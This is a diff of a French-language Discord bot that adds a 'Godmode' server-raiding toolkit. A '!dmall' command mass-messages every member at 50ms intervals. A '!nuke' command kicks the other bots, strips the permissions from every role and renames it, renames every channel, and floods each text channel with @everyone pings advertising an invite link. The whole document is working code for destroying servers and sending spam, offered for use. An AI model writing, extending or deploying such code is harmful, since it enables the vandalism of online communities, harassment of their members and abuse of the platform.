@@ -5,7 +5,7 @@ const http = require('http');
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('Bot Inarrêtable Operational!\n');
+    res.end('Bot Godmode Operational!\n');
 }).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));
 
 const client = new Client({
@@ -21,7 +21,7 @@ const client = new Client({
 const OWNERS = ['1166445202148442112', '330080470983245824'];
 
 client.on('ready', () => {
-    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt et inarrêtable.`);
+    console.log(`Bot connecté en tant que ${client.user.tag} ! Mode Godmode activé.`);
 });
 
 // ==========================================
@@ -30,28 +30,23 @@ client.on('ready', () => {
 client.on('guildMemberAdd', async member => {
     if (member.user.bot && member.id !== client.user.id) {
         try {
-            await member.kick('Anti-bot de sécurité activé : Seul le bot principal est autorisé.');
-        } catch (err) {
-            console.log(`Impossible de kicker le bot ${member.user.tag}`);
-        }
+            await member.kick('Anti-bot de sécurité activé.');
+        } catch (err) {}
     }
 });
 
 client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
 
-    // Vérification si l'auteur fait partie des owners
     const isOwner = OWNERS.includes(message.author.id);
 
     // ==========================================
-    // 1. COMMANDE !DMALL (Ultra-accélérée : 100ms)
+    // 1. COMMANDE !DMALL (Vitesse Turbo Maximale : 50ms)
     // ==========================================
     if (message.content === '!dmall') {
-        if (!isOwner) {
-            return message.reply("❌ Tu n'as pas la permission d'utiliser cette commande.");
-        }
+        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
 
-        await message.reply("💬 **[DMAll Inarrêtable]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
+        await message.reply("💬 **[DMAll Turbo]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
 
         const filter = m => m.author.id === message.author.id;
         
@@ -67,20 +62,13 @@ client.on('messageCreate', async message => {
 
             const previewEmbed = new EmbedBuilder()
                 .setColor('#FEE75C')
-                .setTitle('⚠️ Confirmation requise - DMAll (Turbo)')
-                .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``)
-                .setFooter({ text: `Demandé par ${message.author.tag}` });
+                .setTitle('⚠️ Confirmation requise - DMAll (Godmode Turbo)')
+                .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);
 
             const row = new ActionRowBuilder()
                 .addComponents(
-                    new ButtonBuilder()
-                        .setCustomId('confirm_dmall')
-                        .setLabel('Confirmer l\'envoi')
-                        .setStyle(ButtonStyle.Success),
-                    new ButtonBuilder()
-                        .setCustomId('cancel_dmall')
-                        .setLabel('Annuler')
-                        .setStyle(ButtonStyle.Danger)
+                    new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
                 );
 
             const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
@@ -90,24 +78,13 @@ client.on('messageCreate', async message => {
 
             buttonCollector.on('collect', async interaction => {
                 if (interaction.customId === 'cancel_dmall') {
-                    await interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] });
-                    return;
+                    return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] });
                 }
 
                 if (interaction.customId === 'confirm_dmall') {
                     await interaction.update({ content: "🚀 **Diffusion DMAll turbo lancée !**", embeds: [], components: [] });
 
-                    const initialEmbed = new EmbedBuilder()
-                        .setColor('#5865F2')
-                        .setTitle('🚀 Diffusion en cours...')
-                        .addFields(
-                            { name: '👥 Total', value: 'Calcul...', inline: true },
-                            { name: '✅ Envoyés', value: '0', inline: true },
-                            { name: '❌ Erreurs', value: '0', inline: true },
-                            { name: '📊 Progression', value: '0%', inline: true }
-                        );
-
-                    const statusMsg = await message.channel.send({ embeds: [initialEmbed] });
+                    const statusMsg = await message.channel.send({ content: "📊 Envoi en cours à vitesse maximale..." });
 
                     try {
                         await message.guild.members.fetch();
@@ -116,9 +93,8 @@ client.on('messageCreate', async message => {
 
                         let successCount = 0;
                         let failCount = 0;
-                        let processed = 0;
 
-                        // Vitesse ultra-rapide à 100ms par message
+                        // Envoi ultra-rapide à 50ms par message
                         for (const [id, member] of members) {
                             try {
                                 const finalMessage = messageTemplate
@@ -130,77 +106,73 @@ client.on('messageCreate', async message => {
                             } catch (err) {
                                 failCount++;
                             }
-
-                            processed++;
-                            const percent = Math.round((processed / totalMembers) * 100);
-
-                            if (processed % 15 === 0 || processed === totalMembers) {
-                                const updateEmbed = new EmbedBuilder()
-                                    .setColor('#5865F2')
-                                    .setTitle('🚀 Diffusion en cours...')
-                                    .addFields(
-                                        { name: '👥 Total cibles', value: `${totalMembers}`, inline: true },
-                                        { name: '✅ Envoyés', value: `${successCount}`, inline: true },
-                                        { name: '❌ Échecs (MPs fermés)', value: `${failCount}`, inline: true },
-                                        { name: '📊 Progression', value: `${percent}% (${processed}/${totalMembers})`, inline: false }
-                                    );
-
-                                await statusMsg.edit({ embeds: [updateEmbed] }).catch(() => {});
-                            }
-
-                            await new Promise(resolve => setTimeout(resolve, 100)); 
+                            await new Promise(resolve => setTimeout(resolve, 50)); 
                         }
 
-                        const finalEmbed = new EmbedBuilder()
-                            .setColor('#00FF00')
-                            .setTitle('✅ Diffusion DMAll Terminée !')
-                            .addFields(
-                                { name: '👥 Total', value: `${totalMembers}`, inline: true },
-                                { name: '✅ Succès', value: `${successCount}`, inline: true },
-                                { name: '❌ Échecs', value: `${failCount}`, inline: true }
-                            );
-
-                        await statusMsg.edit({ embeds: [finalEmbed] });
+                        await statusMsg.edit({ content: `✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})` });
 
                     } catch (error) {
-                        console.error(error);
-                        message.channel.send("❌ Erreur critique lors de la récupération des membres.");
+                        message.channel.send("❌ Erreur lors du DMAll.");
                     }
                 }
             });
-
         } catch (err) {
-            message.channel.send("⌛ Temps écoulé ou erreur. Commande annulée.");
+            message.channel.send("⌛ Temps écoulé.");
         }
     }
 
     // ==========================================
-    // 2. COMMANDE !NUKE (Destruction totale et instantanée)
+    // 2. COMMANDE !NUKE (Godmode Total : Rôles + Salons + Bots + Pings)
     // ==========================================
     if (message.content === '!nuke') {
-        if (!isOwner) {
-            return message.reply("❌ Tu n'as pas la permission d'utiliser cette commande.");
-        }
+        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
 
-        await message.reply("💥 **[Nuke Inarrêtable]** Destruction totale du serveur en cours...");
+        await message.reply("💥 **[NUKE GODMODE]** Destruction totale et instantanée du serveur en cours...");
 
         try {
+            // 1. Tenter de placer le bot tout en haut de la hiérarchie des rôles
+            const botMember = await message.guild.members.fetchMe().catch(() => {});
+            if (botMember && botMember.roles) {
+                const highestRole = message.guild.roles.highest;
+                await botMember.setHighestRole(highestRole).catch(() => {});
+            }
+
+            // 2. Kicker tous les autres bots présents sur le serveur instantanément
+            const members = await message.guild.members.fetch();
+            members.forEach(async m => {
+                if (m.user.bot && m.id !== client.user.id) {
+                    await m.kick('Nuke Godmode - Suppression des bots').catch(() => {});
+                }
+            });
+
+            // 3. Strip les permissions et renommer TOUS les rôles en "ez by k2l"
+            const roles = message.guild.roles.cache;
+            roles.forEach(async role => {
+                // Ne pas toucher au rôle @everyone de base pour éviter les erreurs bloquantes de l'API, ni au rôle du bot
+                if (role.id !== message.guild.id && !role.managed) {
+                    await role.edit({
+                        name: 'ez by k2l',
+                        permissions: new PermissionsBitField(0n) // Enlève toutes les perms
+                    }).catch(() => {});
+                }
+            });
+
+            // 4. Renommer les salons et balancer le spam en même temps
             const channels = message.guild.channels.cache;
 
-            for (const [id, channel] of channels) {
-                // Renommer instantanément le salon
+            channels.forEach(async channel => {
                 await channel.setName('ez-by-graveuhq').catch(() => {});
 
-                // Si c'est un salon textuel, balancer les 10 pings everyone en boucle rapide
                 if (channel.isTextBased()) {
                     for (let i = 0; i < 10; i++) {
                         await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
-                        await new Promise(resolve => setTimeout(resolve, 50)); // Vitesse quasi-instantanée
+                        await new Promise(resolve => setTimeout(resolve, 20)); // Vitesse extrême
                     }
                 }
-            }
+            });
+
         } catch (error) {
-            console.error("Erreur lors du nuke :", error);
+            console.error("Erreur critique Nuke :", error);
         }
     }
 });
